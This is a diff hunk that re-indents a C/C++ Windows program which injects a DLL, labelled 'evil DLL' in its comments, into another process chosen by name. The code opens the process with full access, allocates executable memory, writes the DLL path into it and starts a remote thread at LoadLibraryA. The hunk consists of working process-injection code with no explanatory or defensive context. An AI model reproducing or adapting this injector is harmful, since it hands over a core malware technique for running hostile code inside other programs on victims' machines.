@@ -46,39 +46,39 @@ int findMyProc(const char *procname) {
 }
 
 int main(int argc, char* argv[]) {
-	int pid = 0; // process ID
+  int pid = 0; // process ID
   HANDLE ph; // process handle
-	HANDLE rt; // remote thread
-	LPVOID rb; // remote buffer
+  HANDLE rt; // remote thread
+  LPVOID rb; // remote buffer
 
-	// handle to kernel32 and pass it to GetProcAddress
-	HMODULE hKernel32 = GetModuleHandle("Kernel32");
-	VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+  // handle to kernel32 and pass it to GetProcAddress
+  HMODULE hKernel32 = GetModuleHandle("Kernel32");
+  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
 
-	// get process ID by name
+  // get process ID by name
   pid = findMyProc(argv[1]);
-	if (pid == 0) {
+  if (pid == 0) {
     printf("PID not found :( exiting...\n");
     return -1;
   } else {
-		printf("PID = %d\n", pid);
-	}
-
-  // open process
-	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
-  if (ph == NULL) {
-    printf("OpenProcess failed! exiting...\n");
-		return -2;
+    printf("PID = %d\n", pid);
   }
 
-	// allocate memory buffer for remote process
-	rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+  // open process
+  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+  if (ph == NULL) {
+    printf("OpenProcess failed! exiting...\n");
+  return -2;
+  }
 
-	// "copy" evil DLL between processes
-	WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+  // allocate memory buffer for remote process
+  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
-	// our process start new thread
-	rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
-	CloseHandle(ph);
-	return 0;
+  // "copy" evil DLL between processes
+  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+
+  // our process start new thread
+  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+  CloseHandle(ph);
+  return 0;
 }
